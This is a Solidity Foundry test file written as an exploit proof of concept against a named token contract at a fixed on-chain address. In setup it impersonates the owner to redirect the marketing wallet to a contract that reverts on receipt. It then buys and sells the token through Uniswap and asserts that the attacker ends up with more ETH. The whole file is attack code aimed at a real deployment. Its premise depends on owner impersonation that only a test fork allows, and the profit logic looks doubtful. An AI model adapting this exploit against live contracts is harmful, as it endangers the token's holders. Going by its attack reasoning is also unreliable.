// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBossBaby {
    function owner() external view returns (address);
    function changeMarketingWallet(address _marketingWallet) external;
    function enableTrading() external;
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract AttackContract {
    receive() external payable {
        revert("Attack: Revert on receive");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    AttackContract public attackContract;
    address public weth;
    IUniswapV2Router02 public router;
    IBossBaby public token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy attack contract that reverts on receive
        attackContract = new AttackContract();

        // Get contract instance
        token = IBossBaby(TARGET);

        // Get owner address
        address owner = token.owner();

        // Impersonate owner to change marketing wallet
        vm.startPrank(owner);
        token.changeMarketingWallet(address(attackContract));
        vm.stopPrank();

        // Enable trading if not already enabled
        vm.startPrank(owner);
        token.enableTrading();
        vm.stopPrank();

        // Get router and WETH
        router = IUniswapV2Router02(token.uniswapV2Router());
        weth = router.WETH();

        // Give attacker ETH to trade
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Start attack
        vm.startPrank(attacker);

        // Buy tokens to generate fees in contract
        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = TARGET;

        uint256 buyAmount = 10 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0,
            buyPath,
            attacker,
            block.timestamp
        );

        // Get token balance after buy
        uint256 tokenBalance = token.balanceOf(attacker);

        // Approve router to spend tokens
        token.approve(address(router), tokenBalance);

        // Record initial ETH balance
        uint256 initialEthBalance = attacker.balance;

        // Sell tokens to trigger swap mechanism (which will fail on marketing payment)
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Check if we made profit
        uint256 finalEthBalance = attacker.balance;
        assertGt(finalEthBalance, initialEthBalance, "ETH balance should have increased");

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

